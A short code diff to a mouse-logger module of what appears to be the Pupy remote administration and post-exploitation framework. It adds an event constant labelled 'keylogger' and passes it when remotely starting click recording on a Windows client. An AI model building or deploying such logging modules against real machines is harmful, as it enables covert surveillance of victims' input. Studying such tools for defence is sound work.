@@ -4,7 +4,12 @@
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 
+MOUSELOGGER_EVENT = 0x12000001
+
 __class_name__="MouseLoggerModule"
+__events__ = {
+    MOUSELOGGER_EVENT: 'keylogger'
+}
 
 @config(compat="windows", cat="gather")
 class MouseLoggerModule(PupyModule):
@@ -22,7 +27,7 @@ class MouseLoggerModule(PupyModule):
     def run(self, args):
         if args.action == 'start':
             mouselogger_start = self.client.remote('pupwinutils.mouselogger', 'mouselogger_start', False)
-            mouselogger_start()
+            mouselogger_start(event_id=MOUSELOGGER_EVENT)
 
         elif args.action == 'dump':
             self.success("dumping recorded mouse clicks :")
